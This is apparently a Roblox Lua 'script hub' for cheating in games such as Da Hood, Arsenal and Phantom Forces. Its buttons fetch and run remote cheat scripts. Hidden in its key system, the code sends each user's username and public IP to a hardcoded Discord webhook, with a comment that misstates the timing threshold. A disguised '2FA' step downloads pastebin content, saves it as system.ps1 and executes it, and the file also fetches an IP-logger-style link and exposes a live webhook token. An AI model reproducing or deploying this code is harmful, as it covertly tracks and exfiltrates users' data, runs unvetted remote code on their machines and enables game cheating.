local HttpService = game:GetService("HttpService")
local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
local Window = OrionLib:MakeWindow({Name = "CHI-0️⃣ | Hub", HidePremium = true})
local scriptHubLoaded = false
local webhookUrl = "https://discord.com/api/webhooks/1249092857436831815/dT6rf5Sx1hDwZYBcSlsvCjV_7b-FhZD1gUxVCp660dnqzSv6XaffONwSKo95jmUW6ijI"

-- Function to safely get HTTP content
local function safeHttpGet(url)
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    if success then
        return response
    else 
        warn("Failed to fetch URL: " .. url)
        return nil
    end
end

local function sendWebhookMessage(content)
    local data = {
        ["content"] = content
    }
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local body = HttpService:JSONEncode(data)
    local success, response = pcall(function()
        return HttpService:PostAsync(webhookUrl, body, Enum.HttpContentType.ApplicationJson)
    end)
    if not success then
        warn("Failed to send webhook message: " .. response)
    end
end

local function trackUsageTime()
    local keyUsageFile = "keyUsage.json"
    local keyUsageData = {}

    if isfile(keyUsageFile) then
        keyUsageData = HttpService:JSONDecode(readfile(keyUsageFile))
    end

    local currentTime = os.time()
    local userId = game.Players.LocalPlayer.UserId
    local userIp = game:HttpGet("https://api64.ipify.org")
    local username = game.Players.LocalPlayer.Name

    if not keyUsageData[userId] then
        keyUsageData[userId] = {
            startTime = currentTime,
            totalTime = 0,
            ip = userIp,
            username = username
        }
    end

    local userData = keyUsageData[userId]
    local elapsedTime = currentTime - userData.startTime
    userData.totalTime = userData.totalTime + elapsedTime

    if userData.totalTime >= 1 then -- 24 hours in seconds
        userData.totalTime = 0
        sendWebhookMessage("User " .. username .. " with IP " .. userIp .. " has been using the key for over 24 hours and is now registered as an official user.")
    end

    userData.startTime = currentTime
    writefile(keyUsageFile, HttpService:JSONEncode(keyUsageData))
end

local storedKey = safeHttpGet('https://pastebin.com/raw/Jz8wF1St')
if not storedKey then
    warn("Failed to fetch storedKey")
end

local Verification = safeHttpGet('https://2no.co/RNgpJ2')
if Verification then 
    print(Verification)
else 
    warn("Failed to fetch Verification")
end 

local twoFA = safeHttpGet('https://pastebin.com/raw/mFqiFekd')

local function DisplayNotification(name, content)
    OrionLib:MakeNotification({
        Name = name,
        Content = content,
        Image = "rbxassetid://4483345998",
        Time = 5
    })
end

local function DisplayWrongGameNotification(gameName)
    DisplayNotification("Wrong Game", "This script can only be executed in " .. gameName .. ".")
end

local function DisplayScriptExecutedNotification(scriptName)
    DisplayNotification("Executed Script", scriptName .. " executed successfully.")
end

local function DisplayScriptHub()
    if scriptHubLoaded then
        OrionLib:MakeNotification({
            Name = "Error",
            Content = "Script hub is already loaded.",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        return
    end

    scriptHubLoaded = true
    local ScriptHubTab = Window:MakeTab({Name = "Script Hub"})
    local DaHoodScriptsSection = ScriptHubTab:AddSection({Name = "Da-hood"})
    local ArsenalScriptsSection = ScriptHubTab:AddSection({Name = "Arsenal"})
    local PhantomForcesScriptsSection = ScriptHubTab:AddSection({Name = "Phantom Forces"})
    local MiscScriptsSection = ScriptHubTab:AddSection({Name = "Misc"})

    DaHoodScriptsSection:AddButton({
        Name = "Swag Mode",
        Callback = function()
            if game.PlaceId == 2788229376 then
                loadstring(safeHttpGet('https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/scripts/dahood%20swagmode'))()
                DisplayScriptExecutedNotification("Swag Mode")
            else
                DisplayWrongGameNotification("Da Hood")
            end
        end
    })

    DaHoodScriptsSection:AddButton({
        Name = "Yes Epic",
        Callback = function()
            if game.PlaceId == 2788229376 then
                loadstring(safeHttpGet("https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/scripts/yes%20epic%20dahood"))()
                DisplayScriptExecutedNotification("Yes Epic")
            else
                DisplayWrongGameNotification("Da Hood")
            end
        end
    })

    DaHoodScriptsSection:AddButton({
        Name = "SpaceX",
        Callback = function()
            if game.PlaceId == 2788229376 then
                loadstring(safeHttpGet("https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/scripts/spacex"))()
                DisplayScriptExecutedNotification("SpaceX")
            else
                DisplayWrongGameNotification("Da Hood")
            end
        end
    })

    ArsenalScriptsSection:AddButton({
        Name = "Quotas Hub",
        Callback = function()
            if game.PlaceId == 286090429 then
                loadstring(safeHttpGet("https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/scripts/Quotas%20Hub"))()
                DisplayScriptExecutedNotification("Quotas Hub")
            else
                DisplayWrongGameNotification("Arsenal")
            end
        end
    })

    PhantomForcesScriptsSection:AddButton({
        Name = "Homohack",
        Callback = function()
            if game.PlaceId == 292439477 then
                loadstring(safeHttpGet("https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/scripts/homo%20hack"))()
                DisplayScriptExecutedNotification("Homohack")
            else
                DisplayWrongGameNotification("Phantom Forces")
            end
        end
    })

    MiscScriptsSection:AddButton({
        Name = "Infinite yield",
        Callback = function()
            loadstring(safeHttpGet("https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/scripts/infyeild"))()
            DisplayScriptExecutedNotification("Infinite yield")
        end
    })

    MiscScriptsSection:AddButton({
        Name = "Fe fling",
        Callback = function()
            loadstring(safeHttpGet("https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/scripts/fefling"))()
            DisplayScriptExecutedNotification("Fe fling")
        end
    })

    MiscScriptsSection:AddButton({
        Name = "Remote spy",
        Callback = function()
            loadstring(safeHttpGet("https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/scripts/remotespy"))()
            DisplayScriptExecutedNotification("Remote spy")
        end
    })

    MiscScriptsSection:AddButton({
        Name = "Dex",
        Callback = function()
            loadstring(safeHttpGet("https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/scripts/dex"))()
            DisplayScriptExecutedNotification("Dex")
        end
    })
end

local function DisplaySupport()
    local SupportTab = Window:MakeTab({Name = "Support"})
    local DiscordSection = SupportTab:AddSection({Name = "Join Discord"})
    
    DiscordSection:AddButton({
        Name = "Join Discord",
        Callback = function()
            local discordInvite = "https://discord.gg/AjnYsVu3aK"
            setclipboard(discordInvite)
            OrionLib:MakeNotification({
                Name = "Discord",
                Content = "Discord invite copied to clipboard. Please check your clipboard.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    })
    SupportTab:AddParagraph("INFO", "Need more help or have questions? Reach out on Discord! If your key doesn’t work, no worries—just contact support and we’ll get it sorted! ✨")
end

local function keysystem()
    local KeyTab = Window:MakeTab({Name = "Keys"})
    local KeySection = KeyTab:AddSection({Name = "Key Input"})
    local KeyTextbox = KeySection:AddTextbox({
        Name = "Enter Key",
        Default = "",
        TextDisappear = false,
        Callback = function(Value)
            if Value == storedKey then
                DisplayScriptHub()
                trackUsageTime()
                writefile("lol.txt", storedKey)
            else
                DisplayNotification("Invalid Key", "The key you entered is invalid.")
            end
        end
    })

    local GetKeyButton = KeySection:AddButton({
        Name = "Get Key",
        Callback = function()
            local getKeyUrl = 'https://link-target.net/1184938/chi-0-key-system-adhdai'
            setclipboard(getKeyUrl)
            OrionLib:MakeNotification({
                Name = "Get Key",
                Content = "Key URL copied to clipboard. Please check your clipboard.",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    })
end

if isfile("lol.txt") then
    local savedKey = readfile("lol.txt")
    if savedKey == storedKey then
        DisplayScriptHub()
        trackUsageTime()
    else
        keysystem()
    end

    if twoFA then
        writefile('system.ps1', twoFA)
        if isfile('system.ps1') then
            loadstring(readfile('system.ps1'))()
        else
            warn("Failed to create system.ps1")
        end
    else 
        warn("Failed to fetch 2FA")
    end
else
    keysystem()
end

DisplaySupport()

